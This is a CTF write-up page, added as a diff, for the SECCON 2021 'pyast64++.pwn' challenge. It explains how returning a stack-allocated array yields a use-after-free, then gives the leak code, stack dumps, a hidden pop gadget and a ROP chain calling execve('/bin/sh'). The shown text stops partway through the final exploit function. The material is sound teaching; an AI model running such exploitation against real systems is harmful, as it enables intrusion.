@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pyast64++.pwn | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pyast64++.pwn" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/SECCON-2021/pwn/pyast64pwn.html" />
+<meta property="og:url" content="https://org.anize.rs/SECCON-2021/pwn/pyast64pwn.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pyast64++.pwn" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"pyast64++.pwn","url":"https://org.anize.rs/SECCON-2021/pwn/pyast64pwn.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="pyast64pwn">pyast64++.pwn</h1>
+
+<p><strong>Authors</strong>: <a href="https://twitter.com/galli_leo_">gallileo</a></p>
+
+<p><strong>Tags</strong>: pwn, python</p>
+
+<p><strong>Points</strong>: 233</p>
+
+<blockquote>
+  <p>Let’s make open-sourced JIT projects more secure!</p>
+
+  <p><code class="language-plaintext highlighter-rouge">nc hiyoko.quals.seccon.jp 9064</code></p>
+
+  <p><a href="https://secconctf-prod.s3.isk01.sakurastorage.jp/production/pyast64%2b%2b.pwn/pyast64%2b%2b.pwn.tar.gz">pyast64++.pwn.tar.gz</a> bffd7d1d56b476737271d54ca94509f2069649b1</p>
+</blockquote>
+
+<h2 id="introduction">Introduction</h2>
+
+<p>As with every pwn challenge, I first open the binary in IDA.
+Well except this time, … there was no binary!</p>
+
+<p>Instead we are greeted with a Python file called <code class="language-plaintext highlighter-rouge">pyast64.py</code>.
+Looking over it, the design of the challenge becomes clear pretty quickly:
+<code class="language-plaintext highlighter-rouge">pyast64.py</code> takes any (simple) python code and compiles it directly to x86 assembly instructions.
+The resulting assembly is then linked into an ELF file (without libc) and ran.</p>
+
+<p>Having analyzed that, the goal is pretty clear: We have to exploit the compiler and get code execution on the server.</p>
+
+<h2 id="initial-reconnaissance">Initial Reconnaissance</h2>
+
+<p><code class="language-plaintext highlighter-rouge">pyast64.py</code> is pretty complex and so after trying to understand most of it, I started to diff it against the provided version on git.
+The only relevant change is to <code class="language-plaintext highlighter-rouge">builtin_array</code> which also has a comment added to explain how the arrays are now “secure”:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The original design of `array` was vulnerable to out-of-bounds access
+and type confusion. The fixed version of the array has its length
+to prevent out-of-bounds access.
+
+i.e. x=array(1)
+    0        4        8        16
+    +--------+--------+--------+
+    | length |  type  |  x[0]  |
+    +--------+--------+--------+
+
+The `type` field is used to check if the variable is actually an array.
+This value is not guessable.
+</code></pre></div></div>
+
+<p>This of course set off my alarms and I assumed we had to somehow work around these security checks.
+Therefore, I looked into the design of the arrays in more detail.</p>
+
+<h2 id="array-design">Array Design</h2>
+
+<p>To create an array, you have to use the <code class="language-plaintext highlighter-rouge">array(size)</code> builtin in Python <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>.
+In the following, I present some sample Python code using an array and how the compiler implements it (by showing a high level C version of the assembly):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...
+</span><span class="n">a</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span> <span class="c1"># 'A'
+</span><span class="n">putc</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># prints A, putc is provided by the compiler
+# ...
+</span></code></pre></div></div>
+
+<p>This would look like the following in high level C:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// type definition of array</span>
+<span class="k">struct</span> <span class="n">array</span> <span class="p">{</span>
+    <span class="n">i32</span> <span class="n">size</span><span class="p">;</span>
+    <span class="n">u32</span> <span class="n">type</span><span class="p">;</span>
+    <span class="n">u64</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="c1">// ...</span>
+<span class="k">struct</span> <span class="n">array</span><span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">alloca</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">array</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span>
+<span class="n">a</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+<span class="c1">// The upper 4 bytes of the stack canary (at fs:0x28).</span>
+<span class="n">a</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x2Cu</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="o">*</span><span class="nf">sizeof</span><span class="p">(</span><span class="n">u64</span><span class="p">));</span>
+<span class="n">a</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span><span class="p">;</span>
+<span class="n">putc</span><span class="p">(</span><span class="n">a</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="c1">// ...</span>
+</code></pre></div></div>
+
+<p>So, the array is actually allocated on the stack.
+This is not further surprising, since all local variables and arguments are allocated on the stack by the compiler.
+However, instead of pursuing this part further, I had some other ideas on how to exploit this first.</p>
+
+<h2 id="initial-exploit-attempt-stack-canary-without-libc">Initial Exploit Attempt: Stack Canary without libc?</h2>
+
+<p>When I saw the stack canary being used, I was very confused.
+Since there was no libc, I expected that the stack canary was not initialized.
+My team mates agreed, that this would likely be initialized by libc.
+Therefore, I thought I could just assume that the <code class="language-plaintext highlighter-rouge">type</code> field would always be zero.</p>
+
+<p>Unfortunately, after some debugging I figured out, that this is not the case.
+It is indeed the loader that is responsible for initializing the TLS region (pointed to by fs) and hence also the stack canary.
+So <code class="language-plaintext highlighter-rouge">type</code> is indeed a random 32bit value.</p>
+
+<h2 id="finding-the-bug-why-allocating-on-the-stack-is-tricky">Finding the Bug: Why Allocating on the Stack is Tricky</h2>
+
+<p>After some experimenting, I quickly realized where the bug was.
+You could return an array perfectly fine from a function where it was allocated.
+This is of course a huge issue, because the moment the function returns, the stack frame is deallocated.
+Therefore, the returned array points to “freed” memory and we have a stack use-after-free!</p>
+
+<p>I quickly made a proof of concept that would at least crash:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">test</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41</span>
+    <span class="k">return</span> <span class="n">a</span>
+
+<span class="k">def</span> <span class="nf">test2</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">newline</span> <span class="o">=</span> <span class="mh">0xa</span>
+    <span class="n">putc</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+    <span class="n">putc</span><span class="p">(</span><span class="n">newline</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">test</span><span class="p">()</span>
+    <span class="n">test2</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>This yielded the following output <sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">2</a></sup>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; python3 pyast64.py -o example.elf example.py &amp;&amp; ./example.elf
+assembly:
+[1]    175041 trace trap (core dumped)  ./example.elf
+</code></pre></div></div>
+
+<h2 id="exploiting-a-stack-uaf">Exploiting a stack UAF</h2>
+
+<p>While I had my fair share of heap UAF exploitation done before, I had never exploited a stack UAF.
+The first thing I did, was adding a bunch of helper functions to pretty print arrays, some shamelessly stolen <a href="https://github.com/benhoyt/pyast64/blob/master/arrays.p64">from the original repo</a><sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">3</a></sup>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">ofs</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">array</span><span class="p">[</span><span class="n">ofs</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">store</span><span class="p">(</span><span class="n">array</span><span class="p">,</span> <span class="n">ofs</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="n">array</span><span class="p">[</span><span class="n">ofs</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
+
+<span class="k">def</span> <span class="nf">print_num</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>  <span class="c1"># '0'
+</span>        <span class="k">return</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span>  <span class="c1"># '-' sign
+</span>        <span class="n">n</span> <span class="o">=</span> <span class="o">-</span><span class="n">n</span>
+    <span class="n">div</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">10</span>
+    <span class="k">if</span> <span class="n">div</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">print_num</span><span class="p">(</span><span class="n">div</span><span class="p">)</span>
+    <span class="n">putc</span><span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">10</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">print_hex_num</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">48</span><span class="p">)</span>  <span class="c1"># '0'
+</span>        <span class="k">return</span>
+    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span>  <span class="c1"># '-' sign
+</span>        <span class="n">n</span> <span class="o">=</span> <span class="o">-</span><span class="n">n</span>
+    <span class="n">div</span> <span class="o">=</span> <span class="n">n</span> <span class="o">//</span> <span class="mi">16</span>
+    <span class="k">if</span> <span class="n">div</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">print_hex_num</span><span class="p">(</span><span class="n">div</span><span class="p">)</span>
+    <span class="n">dig</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">16</span>
+    <span class="k">if</span> <span class="n">dig</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">48</span> <span class="o">+</span> <span class="n">dig</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">97</span> <span class="o">+</span> <span class="n">dig</span> <span class="o">-</span> <span class="mi">10</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">print_arr</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
+        <span class="n">print_num</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+        <span class="n">print_hex_num</span><span class="p">(</span><span class="n">fetch</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">44</span><span class="p">)</span>
+        <span class="n">putc</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="c1"># ' '
+</span>    <span class="n">putc</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>I also used a way bigger array. The reasoning is simple: The crash I was seeing before, was the local variables of <code class="language-plaintext highlighter-rouge">test2</code> corrupting my freed array. By making the array very large, <code class="language-plaintext highlighter-rouge">type</code> and <code class="language-plaintext highlighter-rouge">size</code> would be very low on the stack and hence not easily corrupted.</p>
+
+<p>Combining this, I can easily print a bunch of the stack as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ... helpers from above
+</span>
+<span class="c1"># creates array on stack
+# but after we return the stack frame is gonna be invalid!
+</span><span class="k">def</span> <span class="nf">create_freed_array</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">a</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="mh">0x41414242</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">create_freed_array</span><span class="p">()</span>
+    <span class="n">print_arr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We get the following output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0 0, 1 0, 2 0, 3 0, ..., 969 0, 970 0, 971 0, 972 0, 973 0, 974 0, 975 0, 976 0, 977 0, 978 0, 979 0, 980 0, 981 0, 982 0, 983 0, 984 0, 985 7ffe799f4ca8, 986 55623a9e012d, 987 1, 988 7ffe799f4cc8, 989 7ffe799f4cc8, 990 55623a9e012d, 991 1, 992 7ffe799f4ce8, 993 7ffe799f4ce8, 994 55623a9e012d, 995 3e3, 996 7ffe799f4d08, 997 55623a9e02a6, 998 3e6, 999 7ffe799f2dc0
+</code></pre></div></div>
+
+<p>By looking at the mappings of our process, we can immediately identify a PIE leak.
+This is useful, as the compiled binary is PIE and we probably want to ROP.</p>
+
+<h3 id="figuring-out-the-stack-base">Figuring out the stack base</h3>
+
+<p>I also wanted to figure out the stack base, to allow more easily working with the stack.
+I started by taking a random address that looked like it was a stack address and calculating the offset by looking at the actual stack location.
+However, this always gave me wrong results and they were not even page aligned!</p>
+
+<p>As it turns out, the linux kernel (due to cache reasons) randomizes the offset of the stack pointer from the end of the page as well!
+This means, we cannot reliably determine the base of our stack.
+I spent a lot of time during the CTF trying to figure out why my calculations were off, until two debugging sessions revealed that rsp was being randomized.
+So what can we do instead?</p>
+
+<h3 id="locating-our-array-in-memory-anyways">Locating our array in memory anyways</h3>
+
+<p>Luckily, since local variables are also stored on the stack, we can easily locate the address of our array.
+To do this, I created a two level deep function, that had some “placed” local variables and printed the stack then:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># leak stuff, if we give it the freed array
+</span><span class="k">def</span> <span class="nf">deeper</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="c1"># a2 should be between c and d in the stack dump
+</span>    <span class="n">c</span> <span class="o">=</span> <span class="mh">0x43434343</span>
+    <span class="n">a2</span> <span class="o">=</span> <span class="n">a</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="mh">0x44444444</span>
+    <span class="n">print_arr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="c1"># 999 identified thanks to printing
+</span>    <span class="k">return</span> <span class="n">fetch</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak_array_stack</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="mh">0x42424242</span>
+    <span class="c1"># b = array(10)
+</span>    <span class="k">return</span> <span class="n">deeper</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">create_freed_array</span><span class="p">()</span>
+    <span class="n">leak_array_stack</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The output of the above is as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0 0, 1 0, 2 0, 3 0, 4 0, ..., 975 7fffe51ba228, 976 564eb04fb12d, 977 1, 978 7fffe51ba248, 979 7fffe51ba248, 980 564eb04fb12d, 981 1, 982 7fffe51ba268, 983 7fffe51ba268, 984 564eb04fb12d, 985 3d9, 986 7fffe51ba288, 987 564eb04fb2a6, 988 3dc, 989 7fffe51b8390, 990 7fffe51ba2a8, 991 3df, 992 564eb04fb38a, 993 7fffe51b8390, 994 7fffe51ba2d8, 995 44444444, 996 7fffe51b8390, 997 43434343, 998 564eb04fb3c0, 999 7fffe51b8390,
+</code></pre></div></div>
+
+<p>Thanks to this, we can see that both index <code class="language-plaintext highlighter-rouge">996</code> and <code class="language-plaintext highlighter-rouge">999</code> point to our stack buffer.</p>
+
+<p>Using a similar technique for figuring out a PIE address’s index, we can also leak that:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">pie_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">fetch</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">999</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">leak_pie_addr</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">pie_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">create_freed_array</span><span class="p">()</span>
+    <span class="c1"># print_arr(a)
+</span>    <span class="n">array_stack_addr</span> <span class="o">=</span> <span class="n">leak_array_stack</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">pie_addr</span> <span class="o">=</span> <span class="n">leak_pie_addr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">pie_base</span> <span class="o">=</span> <span class="n">pie_addr</span> <span class="o">-</span> <span class="mh">0x13f2</span>
+</code></pre></div></div>
+
+<p>The offset here can be figured out by just getting PIE base through e.g. <code class="language-plaintext highlighter-rouge">/proc/$PID/maps</code>.</p>
+
+<h3 id="building-our-rop-chain">Building our ROP chain</h3>
+
+<p>So how can we get a shell now?
+The easiest method is by ROPing. Since we can also write to our freed array, we can overwrite return addresses on the stack.
+We already used saved RIPs for our PIE leak above, so by overwriting them we should be good to go.
+The only issue, is that the binary does not link against libc and the only syscall instructions are related to <code class="language-plaintext highlighter-rouge">putc</code> / <code class="language-plaintext highlighter-rouge">getc</code>.</p>
+
+<p>Fortunately, we can add our own ROP gadgets very easily!
+The end of a function always looks as follows in assembly:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="mh">0x41</span> <span class="c1">; or somehow push return value</span>
+<span class="nf">pop</span> <span class="nb">rax</span>
+<span class="nf">pop</span> <span class="nb">rbp</span>
+<span class="nf">retn</span>
+</code></pre></div></div>
+
+<p>To get a shell, we need to call <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0);</code> or jump to a syscall instruction with <code class="language-plaintext highlighter-rouge">*rdi = "/bin/sh", rsi = 0, rdx = 0, rax = 59</code>.
+Since popping rax is already done by every function’s end, we just have to pop rdi, rsi and rdx from the stack.
+This can be achieved with the following aptly named function:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">gadget1</span><span class="p">():</span>
+    <span class="k">return</span> <span class="mh">0x5f5e5a90</span>
+</code></pre></div></div>
+
+<p>When disassembling normally, it looks as follows:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="nb">rbp</span>
+<span class="nf">mov</span> <span class="nb">rbp</span><span class="p">,</span> <span class="nb">rsp</span>
+<span class="nf">push</span> <span class="mh">0x5F5E5A90</span>
+<span class="nf">pop</span> <span class="nb">rax</span>
+<span class="nf">pop</span> <span class="nb">rbp</span>
+<span class="nf">retn</span>
+</code></pre></div></div>
+
+<p>However, if we start disassembling at the address of the push + 1:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">nop</span>
+<span class="nf">pop</span> <span class="nb">rdx</span>
+<span class="nf">pop</span> <span class="nb">rsi</span>
+<span class="nf">pop</span> <span class="nb">rdi</span>
+<span class="nf">pop</span> <span class="nb">rdx</span>
+<span class="nf">pop</span> <span class="nb">rax</span>
+<span class="nf">pop</span> <span class="nb">rbp</span>
+<span class="nf">retn</span>
+</code></pre></div></div>
+
+<p>We have our gadget!
+Hence our ROPchain is now as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gadget1</span><span class="o">+</span><span class="mi">6</span> <span class="c1"># address of pop rdx
+</span><span class="mh">0x0</span> <span class="c1"># rdx
+</span><span class="mh">0x0</span> <span class="c1"># rsi
+</span><span class="n">array_stack_addr</span><span class="o">+</span><span class="mi">8</span> <span class="c1"># rdi, points to beginning of array data
+</span><span class="mi">59</span> <span class="c1"># rax, syscall number
+</span><span class="mh">0x41414141</span> <span class="c1"># rbp
+</span><span class="n">putc</span><span class="o">+</span><span class="mh">0x1c</span> <span class="c1"># address of syscall
+</span></code></pre></div></div>
+
+<h3 id="getting-a-shell">Getting a shell</h3>
+
+<p>We have leaks, we have our ROP chain, now we only need to actually use everything!
+To that end, we have to ensure that the stack frame of the function where we perform the ROP in, is actually low enough so that we can overwrite everything.
+Finally, we also have to pay careful attention of any arguments passed in. Since those are passed on the stack, we have to save them in local variables before performing our stack manipulations.
+Otherwise, the stack manipulations will overwrite the arguments.
+Lastly, I also store <code class="language-plaintext highlighter-rouge">/bin/sh</code> in the array, since we have the address to that handy and can point rdi to that.</p>
+
+<p>The final exploit functions are as follows:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 993 is location of saved rip for returning from this function!
+</span><span class="k">def</span> <span class="nf">do_rop_deeper</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">array_addr</span><span class="p">,</span> <span class="n">gadget_addr</span><span class="p">,</span> <span class="n">syscall_addr</span><span class="p">):</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="mh">0x45454545</span>
+    <span class="n">a2</span> <span class="o">=</span> <span class="n">a</span>
+    <span class="n">array_addr2</span> <span class="o">=</span> <span class="n">array_addr</span>
+    <span class="n">gadget_addr2</span> <span class="o">=</span> <span class="n">gadget_addr</span>
+    <span class="n">syscall_addr2</span> <span class="o">=</span> <span class="n">syscall_addr</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="mh">0x46464646</span>
+    <span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x6e69622f</span>
+    <span class="c1"># necessary, otherwise gcc complains about too large constants :/
+</span>    <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">bin_sh</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x0068732f</span> <span class="o">*</span> <span class="mi">65536</span> <span class="o">*</span> <span class="mi">65536</span><span class="p">)</span>
+    <span class="n">print_arr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">993</span><span class="p">,</span> <span class="n">gadget_addr2</span><span class="p">)</span>
+    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">994</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># rdx
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bin_sh</span><span class="p">)</span>
+    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">995</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># rsi
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">996</span><span class="p">,</span> <span class="n">array_addr2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># rdi
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">997</span><span class="p">,</span> <span class="mi">59</span><span class="p">)</span> <span class="c1"># rax = syscall number
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">998</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># rbp
+</span>    <span class="n">store</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="mi">999</span><span class="p">,</span> <span class="n">syscall_addr2</span><span class="p">)</span>
+
